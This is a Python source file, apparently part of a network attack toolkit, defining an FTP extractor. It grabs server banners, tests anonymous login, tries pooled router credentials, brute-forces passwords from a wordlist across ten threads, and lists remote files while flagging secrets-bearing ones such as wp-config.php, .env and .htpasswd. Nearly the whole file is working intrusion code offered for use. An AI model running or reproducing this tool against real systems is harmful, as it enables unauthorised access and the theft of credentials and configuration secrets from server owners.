"""FTP extractor — connects and reads server banner, tests anonymous login."""

import socket
import ftplib
import socket
from concurrent.futures import ThreadPoolExecutor

class FTPExtractor:
    """Attempts to fingerprint an open FTP port and test for anonymous access."""

    def __init__(self, ip: str, port: int = 21, credentials: list = None, wordlist_path: str = None):
        """Initialize with target IP, port, optional credential list and wordlist.

        Args:
            ip (str): Target IP address.
            port (int): FTP port, default 21.
            credentials (list): List of (user, password) tuples from router credential pool.
            wordlist_path (str): Path to password wordlist for brute force.
        """
        self.ip = ip
        self.port = port
        self.credentials = credentials or []
        self.wordlist_path = wordlist_path
        self._found = None  # set on first successful login

    def run(self) -> dict:
        """Connect to FTP, read banner, test anonymous login, brute force credentials,
        and if login succeeds list directory contents looking for config files.

        Returns:
            dict: status, banner, anonymous_access, credentials_found, files.
        """
        print(f"  [FTP] Connecting to {self.ip}:{self.port}")

        # Banner grab via raw socket first — ftplib consumes it
        banner = self._grab_banner()
        if banner:
            print(f"  [FTP] Banner: {banner}")

        result = {
            'status': 'open',
            'banner': banner,
            'anonymous_access': False,
            'credentials_found': None,
            'files': [],
        }

        # 1. Anonymous login
        anon_result = self._try_login('anonymous', 'anonymous@')
        if anon_result:
            print(f"  [FTP] CRITICAL — anonymous login succeeded")
            result['anonymous_access'] = True
            result['credentials_found'] = ('anonymous', 'anonymous@')
            result['files'] = self._list_files(anon_result)
            return result

        # 2. Injected credentials from router pool
        for user, password in self.credentials:
            ftp = self._try_login(user, password)
            if ftp:
                print(f"  [FTP] CRITICAL — login succeeded: {user}:{password}")
                result['credentials_found'] = (user, password)
                result['files'] = self._list_files(ftp)
                return result

        # 3. Wordlist brute force (threaded)
        if self.wordlist_path:
            found = self._brute_force()
            if found:
                user, password = found
                print(f"  [FTP] CRITICAL — brute force succeeded: {user}:{password}")
                result['credentials_found'] = found
                ftp = self._try_login(user, password)
                if ftp:
                    result['files'] = self._list_files(ftp)

        return result

    def _grab_banner(self) -> str | None:
        """Grab FTP banner via raw socket before ftplib takes over.

        Returns:
            str | None: Banner string or None on failure.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.ip, self.port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner
        except Exception:
            return None

    def _try_login(self, user: str, password: str) -> ftplib.FTP | None:
        """Attempt a single FTP login and return the live FTP object on success.

        Args:
            user (str): Username to try.
            password (str): Password to try.

        Returns:
            ftplib.FTP | None: Live connected FTP instance or None on failure.
        """
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.ip, self.port, timeout=5)
            ftp.login(user, password)
            return ftp
        except ftplib.error_perm:
            return None
        except Exception:
            return None

    def _list_files(self, ftp: ftplib.FTP) -> list:
        """List files recursively up to 2 levels deep, flagging config files.

        Args:
            ftp (ftplib.FTP): Live authenticated FTP session.

        Returns:
            list: File paths found on the server.
        """
        interesting = [
            'wp-config.php', 'config.php', '.env', 'config.yml',
            'settings.py', 'database.yml', '.htpasswd', 'backup',
        ]
        files = []
        try:
            entries = ftp.nlst()
            for entry in entries:
                files.append(entry)
                if any(kw in entry.lower() for kw in interesting):
                    print(f"  [FTP] Interesting file: {entry}")
                try:
                    sub = ftp.nlst(entry)
                    for f in sub:
                        files.append(f)
                        if any(kw in f.lower() for kw in interesting):
                            print(f"  [FTP] Interesting file: {f}")
                except Exception:
                    pass
            ftp.quit()
        except Exception as e:
            print(f"  [FTP] File listing failed: {e}")
        return files

    def _brute_force(self) -> tuple | None:
        """Multithreaded brute force using wordlist against common usernames.

        Uses ThreadPoolExecutor with 10 workers. Stops on first success.

        Returns:
            tuple | None: (user, password) on success or None.
        """
        usernames = ['root', 'admin', 'ftp', 'user', 'ftpuser', 'anonymous']

        try:
            with open(self.wordlist_path, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"  [FTP] Could not read wordlist: {e}")
            return None

        pairs = [(u, p) for u in usernames for p in passwords]

        def attempt(pair):
            if self._found:
                return None
            user, password = pair
            ftp = self._try_login(user, password)
            if ftp:
                ftp.quit()
                return (user, password)
            return None

        with ThreadPoolExecutor(max_workers=10) as executor:
            for result in executor.map(attempt, pairs):
                if result:
                    self._found = result
                    return result

        return None

    def _try_anonymous(self, sock: socket.socket) -> bool:
        """Attempt anonymous FTP login using 'anonymous' / 'anonymous@'.

        Args:
            sock (socket.socket): Already-connected socket.

        Returns:
            bool: True if anonymous login succeeded, False otherwise.
        """
        try:
            sock.send(b'USER anonymous\r\n')
            resp = sock.recv(1024).decode('utf-8', errors='ignore')
            if '331' in resp:  # 331 = password required, anonymous user accepted
                sock.send(b'PASS anonymous@\r\n')
                resp = sock.recv(1024).decode('utf-8', errors='ignore')
                if '230' in resp:  # 230 = login successful
                    print(f"  [FTP] CRITICAL — anonymous login succeeded")
                    return True
            print(f"  [FTP] Anonymous login denied")
            return False
        except Exception:
            return False
